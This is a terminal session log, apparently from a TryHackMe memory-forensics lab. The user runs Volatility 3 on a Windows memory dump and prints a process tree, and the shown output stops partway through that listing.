@@ -1,0 +1,1056 @@
+Script started on 2026-10-23 01:56:49+03:00 [COMMAND="ssh -i ubuntu.key ubuntu@day.o.thm" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="119" LINES="29"]
+The authenticity of host 'day.o.thm (10.82.147.184)' can't be established.
+ED25519 key fingerprint is: SHA256:WRl6MM2KSFiF8uTE+oi2D1kCrl2TvStr7lhuY6epIKg
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'day.o.thm' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 7.0.0-1014-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Thu Oct 22 22:56:51 UTC 2026
+
+  System load:  0.08               Temperature:           -273.1 C
+  Usage of /:   70.9% of 24.16GB   Processes:             228
+  Memory usage: 27%                Users logged in:       0
+  Swap usage:   0%                 IPv4 address for ens5: 10.82.147.184
+
+ * Ubuntu Pro delivers the most comprehensive open source security and
+   compliance features.
+
+   https://ubuntu.com/aws/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+2 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+54 additional security updates can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ ls
+[?2004l[0m[01;34mDesktop[0m  [01;34mDocuments[0m  [01;34mDownloads[0m  [01;34mMusic[0m  [01;34mPictures[0m  [01;34mPublic[0m  [01;34mTemplates[0m  [01;34mVideos[0m  [01;34msnap[0m
+[?2004h]0;ubuntu@tryhackme: ~[01;32mubuntu@tryhackme[00m:[01;34m~[00m$ cd Desktop/
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ ls
+[?2004l[0m[01;34martifacts[0m  [01;32mmate-terminal.desktop[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ ls sr[K[Kartifacts/
+[?2004lmemory.mem  [0m[01;34msymbols[0m  [01;34mtools[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ du -sh me[K[Kartifacts/memory.mem 
+[?2004l4.1G	artifacts/memory.mem
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ echo "Yep another large file, too bored for this, I am done f[Ktoday, better luck next time"
+[?2004lYep another large file, too bored for this, I am done today, better luck next time
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ ls artifacts/symbols/
+[?2004l[0m[01;34mwindows[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop[00m$ cd artifacts/
+[?2004l[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls symbols/windows/
+[?2004l[0m[01;34mntkrnlmp.pdb[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls symbols/windows/ntkrnlmp.pdb/
+[?2004l[0m[01;31m68A17FAF3012B7846079AEECDBE0A583-1.json.xz[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ du -sh symbols/
+[?2004l652K	symbols/
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls
+[?2004lmemory.mem  [0m[01;34msymbols[0m  [01;34mtools[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls tools
+[?2004l[0m[01;34memulation[0m  [01;34mghidra_12.1.4_PUBLIC[0m  [01;34mjdk[0m  [01;34mvenv[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ ls -al tools/
+[?2004ltotal 24
+drwxr-xr-x  6 ubuntu ubuntu 4096 Oct 14 15:40 [0m[01;34m.[0m
+drwxr-xr-x  4 ubuntu ubuntu 4096 Oct 14 15:42 [01;34m..[0m
+drwxr-xr-x  3 ubuntu ubuntu 4096 Oct 14 15:35 [01;34memulation[0m
+drwxr-xr-x 10 ubuntu ubuntu 4096 Sep 21 16:38 [01;34mghidra_12.1.4_PUBLIC[0m
+drwxr-xr-x  8 ubuntu ubuntu 4096 Oct 14 15:40 [01;34mjdk[0m
+drwxr-xr-x  5 ubuntu ubuntu 4096 Oct 14 15:35 [01;34mvenv[0m
+[?2004h]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7msource tools/venv/bin/activate[27msource tools/venv/bin/activate
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mwhich vol[27mwhich vol
+[?2004l/home/ubuntu/Desktop/artifacts/tools/venv/bin/vol
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.info[27mvol -s symbols -f memory.mem windows.info
+[?2004lVolatility 3 Framework 2.28.2
+Progress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        
+Variable	Value
+
+Kernel Base	0xf8061f000000
+DTB	0x1aa000
+Symbols	file:///home/ubuntu/Desktop/artifacts/symbols/windows/ntkrnlmp.pdb/68A17FAF3012B7846079AEECDBE0A583-1.json.xz
+Is64Bit	True
+IsPAE	False
+layer_name	0 WindowsIntel32e
+memory_layer	1 Elf64Layer
+base_layer	2 FileLayer
+KdVersionBlock	0xf8061fc0f398
+Major/Minor	15.19041
+MachineType	34404
+KeNumberProcessors	2
+SystemTime	2026-10-05 03:54:42+00:00
+NtSystemRoot	C:\Windows
+NtProductType	NtProductWinNt
+NtMajorVersion	10
+NtMinorVersion	0
+PE MajorOperatingSystemVersion	10
+PE MinorOperatingSystemVersion	0
+PE Machine	34404
+PE TimeDateStamp	Wed Jun 28 04:14:26 1995
+[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.pstree > /tmp/pstree.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.pstree > /tmp/pstree.txt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        [?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ 
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mvol -s symbols -f memory.mem windows.cmdline > /tmp/cmdline.txt[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cvol -s symbols -f memory.mem windows.cmdline > /tmp/cmdline.txt
+[?2004lProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:    7.91		Scanning Elf64Layer using PageMapScannerProgress:   15.11		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:   64.75		Scanning Elf64Layer using PageMapScannerProgress:    0.00		Scanning Elf64Layer using PageMapScannerProgress:  100.00		Stacking attempts finished              Progress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:    0.00		Scanning layer_name using PdbSignatureScannerProgress:  100.00		PDB scanning finished                        [?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ 
+[?2004l[?2004h(venv) ]0;ubuntu@tryhackme: ~/Desktop/artifacts[01;32mubuntu@tryhackme[00m:[01;34m~/Desktop/artifacts[00m$ [7mcat /tmp/pstree.txt[27mcat /tmp/pstree.txt
+[?2004lVolatility 3 Framework 2.28.2
+
+PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	Audit	Cmd	Path
+
+4	0	System	0xbd8fd4061040	108	-	N/A	False	2026-10-05 06:53:24.000000 UTC	N/A	-	-	-
+* 328	4	smss.exe	0xbd8fd48bf040	4	-	N/A	False	2026-10-05 06:53:24.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\smss.exe	\SystemRoot\System32\smss.exe	\SystemRoot\System32\smss.exe
+* 92	4	Registry	0xbd8fd41d2040	4	-	N/A	False	2026-10-05 06:53:07.000000 UTC	N/A	Registry	-	-
+* 1876	4	MemCompression	0xbd8fdade1040	62	-	N/A	False	2026-10-05 03:53:33.000000 UTC	N/A	MemCompression	-	-
+416	404	csrss.exe	0xbd8fd48c6080	13	-	0	False	2026-10-05 06:53:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
+492	404	wininit.exe	0xbd8fd5d7f080	5	-	0	False	2026-10-05 06:53:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\wininit.exe	wininit.exe	C:\Windows\system32\wininit.exe
+* 636	492	lsass.exe	0xbd8fd5d78080	11	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\lsass.exe	C:\Windows\system32\lsass.exe	C:\Windows\system32\lsass.exe
+* 628	492	services.exe	0xbd8fd5d34080	10	-	0	False	2026-10-05 06:53:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\services.exe	C:\Windows\system32\services.exe	C:\Windows\system32\services.exe
+** 2176	628	svchost.exe	0xbd8fdaf10300	7	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc	C:\Windows\system32\svchost.exe
+** 2304	628	spoolsv.exe	0xbd8fdaf790c0	18	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe	C:\Windows\System32\spoolsv.exe
+** 2944	628	sppsvc.exe	0xbd8fdb2b7080	7	-	0	False	2026-10-05 03:53:34.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\sppsvc.exe	C:\Windows\system32\sppsvc.exe	C:\Windows\system32\sppsvc.exe
+** 7040	628	svchost.exe	0xbd8fd5ec32c0	8	-	0	False	2026-10-05 03:54:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p	C:\Windows\system32\svchost.exe
+** 1284	628	svchost.exe	0xbd8fdac22300	10	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s EventLog	C:\Windows\System32\svchost.exe
+** 1412	628	svchost.exe	0xbd8fdac922c0	5	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s nsi	C:\Windows\system32\svchost.exe
+** 1796	628	svchost.exe	0xbd8fdad10080	4	-	0	False	2026-10-05 03:53:32.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k netsvcs -p -s Themes	C:\Windows\System32\svchost.exe
+** 1032	628	svchost.exe	0xbd8fdab57300	5	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s TimeBrokerSvc	C:\Windows\system32\svchost.exe
+** 5116	628	SearchIndexer.	0xbd8fdbbad080	19	-	0	False	2026-10-05 03:53:40.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SearchIndexer.exe	C:\Windows\system32\SearchIndexer.exe /Embedding	C:\Windows\system32\SearchIndexer.exe
+*** 5656	5116	SearchFilterHo	0xbd8fdc284080	7	-	0	False	2026-10-05 03:54:09.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SearchFilterHost.exe	"C:\Windows\system32\SearchFilterHost.exe" 0 796 800 808 8192 804 780 	C:\Windows\system32\SearchFilterHost.exe
+*** 5540	5116	SearchProtocol	0xbd8fdc2be0c0	10	-	0	False	2026-10-05 03:54:09.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SearchProtocolHost.exe	"C:\Windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe1_ Global\UsGthrCtrlFltPipeMssGthrPipe1 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" 	C:\Windows\system32\SearchProtocolHost.exe
+** 1784	628	svchost.exe	0xbd8fdad0f080	9	-	0	False	2026-10-05 03:53:32.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain	C:\Windows\system32\svchost.exe
+** 4496	628	svchost.exe	0xbd8fdb8020c0	5	-	0	False	2026-10-05 03:53:38.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s WdiSystemHost	C:\Windows\System32\svchost.exe
+** 2068	628	svchost.exe	0xbd8fdaedd2c0	4	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p	C:\Windows\System32\svchost.exe
+** 5268	628	svchost.exe	0xbd8fdbff6240	6	-	0	False	2026-10-05 03:53:41.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k appmodel -p -s camsvc	C:\Windows\system32\svchost.exe
+** 408	628	svchost.exe	0xbd8fdab3f280	5	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService	C:\Windows\System32\svchost.exe
+** 1176	628	svchost.exe	0xbd8fdabf4240	8	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s ProfSvc	C:\Windows\system32\svchost.exe
+** 3608	628	svchost.exe	0xbd8fdb6cd280	5	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TabletInputService	C:\Windows\System32\svchost.exe
+*** 3692	3608	ctfmon.exe	0xbd8fdb76a080	10	-	1	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\ctfmon.exe	"ctfmon.exe"	C:\Windows\system32\ctfmon.exe
+** 4632	628	svchost.exe	0xbd8fdb9bf300	7	-	1	False	2026-10-05 03:53:38.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc	C:\Windows\system32\svchost.exe
+** 924	628	svchost.exe	0xbd8fda9ab240	5	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k DcomLaunch -p -s LSM	C:\Windows\system32\svchost.exe
+** 2076	628	svchost.exe	0xbd8fdaede080	11	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService -p -s Dnscache	C:\Windows\system32\svchost.exe
+** 5912	628	svchost.exe	0xbd8fdbfa2080	5	-	0	False	2026-10-05 03:53:52.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s NgcSvc	C:\Windows\system32\svchost.exe
+** 1952	628	svchost.exe	0xbd8fdae56280	4	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder	C:\Windows\System32\svchost.exe
+** 2084	628	svchost.exe	0xbd8fdaedf080	15	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p	C:\Windows\system32\svchost.exe
+** 1704	628	svchost.exe	0xbd8fd4066080	11	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalService -p -s netprofm	C:\Windows\System32\svchost.exe
+** 3368	628	svchost.exe	0xbd8fdb614240	10	-	0	False	2026-10-05 03:53:35.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s TokenBroker	C:\Windows\system32\svchost.exe
+** 1964	628	svchost.exe	0xbd8fdae582c0	8	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s FontCache	C:\Windows\system32\svchost.exe
+** 2348	628	svchost.exe	0xbd8fdb03e2c0	19	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p	C:\Windows\system32\svchost.exe
+** 3248	628	svchost.exe	0xbd8fdb50a300	12	-	1	False	2026-10-05 03:53:35.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc	C:\Windows\system32\svchost.exe
+** 2228	628	svchost.exe	0xbd8fdaf35240	8	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k netsvcs -p -s ShellHWDetection	C:\Windows\System32\svchost.exe
+** 4532	628	svchost.exe	0xbd8fdafec080	8	-	0	False	2026-10-05 03:53:38.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s PcaSvc	C:\Windows\system32\svchost.exe
+** 1336	628	svchost.exe	0xbd8fdac4e240	9	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s UserManager	C:\Windows\system32\svchost.exe
+*** 3228	1336	sihost.exe	0xbd8fdb508080	18	-	1	False	2026-10-05 03:53:35.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\sihost.exe	sihost.exe	C:\Windows\system32\sihost.exe
+**** 6960	3228	LocalBridge.ex	0xbd8fd4a51280	16	-	1	False	2026-10-05 03:54:38.000000 UTC	N/A	\Device\HarddiskVolume1\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.1903.1152.0_x64__8wekyb3d8bbwe\LocalBridge.exe	"C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.1903.1152.0_x64__8wekyb3d8bbwe\LocalBridge.exe" /InvokerPRAID: Microsoft.MicrosoftOfficeHub	C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_18.1903.1152.0_x64__8wekyb3d8bbwe\LocalBridge.exe
+** 440	628	svchost.exe	0xbd8fda9f5240	7	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc	C:\Windows\system32\svchost.exe
+** 2616	628	svchost.exe	0xbd8fdb0f7240	6	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s LanmanServer	C:\Windows\system32\svchost.exe
+** 2556	628	svchost.exe	0xbd8fdb0d3240	13	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s Winmgmt	C:\Windows\system32\svchost.exe
+** 1472	628	svchost.exe	0xbd8fdae992c0	10	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p	C:\Windows\System32\svchost.exe
+** 1220	628	svchost.exe	0xbd8fdac06300	5	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s DispBrokerDesktopSvc	C:\Windows\system32\svchost.exe
+** 2756	628	svchost.exe	0xbd8fdb1d9240	16	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k NetSvcs -p -s iphlpsvc	C:\Windows\System32\svchost.exe
+** 2628	628	svchost.exe	0xbd8fdb3202c0	11	-	0	False	2026-10-05 03:53:34.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -s RmSvc	C:\Windows\System32\svchost.exe
+** 840	628	svchost.exe	0xbd8fdab182c0	4	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p	C:\Windows\system32\svchost.exe
+** 1480	628	svchost.exe	0xbd8fdad0b300	7	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s Dhcp	C:\Windows\system32\svchost.exe
+** 2632	628	svchost.exe	0xbd8fdb142240	4	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s TrkWks	C:\Windows\System32\svchost.exe
+** 2380	628	svchost.exe	0xbd8fdb00d2c0	6	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k NetworkService -p -s LanmanWorkstation	C:\Windows\System32\svchost.exe
+** 1488	628	svchost.exe	0xbd8fd4084280	12	-	0	False	2026-10-05 06:53:31.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s DsmSvc	C:\Windows\system32\svchost.exe
+** 4176	628	svchost.exe	0xbd8fdb8712c0	12	-	0	False	2026-10-05 03:53:37.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k AppReadiness -p -s AppReadiness	C:\Windows\System32\svchost.exe
+** 5840	628	SecurityHealth	0xbd8fd48bb080	16	-	0	False	2026-10-05 03:53:52.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\SecurityHealthService.exe	C:\Windows\system32\SecurityHealthService.exe	C:\Windows\system32\SecurityHealthService.exe
+** 2520	628	svchost.exe	0xbd8fd4080080	19	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k utcsvc -p	C:\Windows\System32\svchost.exe
+** 2648	628	wlms.exe	0xbd8fdb154200	4	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\wlms\wlms.exe	C:\Windows\system32\wlms\wlms.exe	C:\Windows\system32\wlms\wlms.exe
+** 2780	628	svchost.exe	0xbd8fdb2272c0	4	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\System32\svchost.exe -k LocalService -p -s WdiServiceHost	C:\Windows\System32\svchost.exe
+** 3548	628	svchost.exe	0xbd8fdb67a240	15	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository	C:\Windows\system32\svchost.exe
+** 3676	628	svchost.exe	0xbd8fdb7692c0	11	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc	C:\Windows\system32\svchost.exe
+** 3932	628	NisSrv.exe	0xbd8fdb7b52c0	6	-	0	False	2026-10-05 03:53:36.000000 UTC	N/A	\Device\HarddiskVolume1\Program Files\Windows Defender\NisSrv.exe	"C:\Program Files\Windows Defender\NisSrv.exe"	C:\Program Files\Windows Defender\NisSrv.exe
+** 2528	628	svchost.exe	0xbd8fdb0ce2c0	8	-	0	False	2026-10-05 03:53:33.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k NetworkService -p -s CryptSvc	C:\Windows\system32\svchost.exe
+** 868	628	svchost.exe	0xbd8fda95f2c0	16	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k RPCSS -p	C:\Windows\system32\svchost.exe
+** 484	628	svchost.exe	0xbd8fdaa86240	9	-	0	False	2026-10-05 06:53:30.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\svchost.exe	C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc	C:\Windows\system32\svchost.exe
+*** 500	484	csrss.exe	0xbd8fd5dd9140	13	-	1	False	2026-10-05 06:53:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\csrss.exe	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16	C:\Windows\system32\csrss.exe
+*** 556	484	winlogon.exe	0xbd8fd5ef8080	6	-	1	False	2026-10-05 06:53:29.000000 UTC	N/A	\Device\HarddiskVolume1\Windows\System32\winlogon.exe	winlogon.exe	C:\Windows\system32\winlogon.exe
+**** 2496	556	userinit.exe	0xbd8fdb865340	0	-	1	False	2026-10-05 03:53:37.000000 UTC	2026-10-05 03:54:00.000000 UTC	\Device\HarddiskVolume1\Windows\System32\userinit.exe	-	-
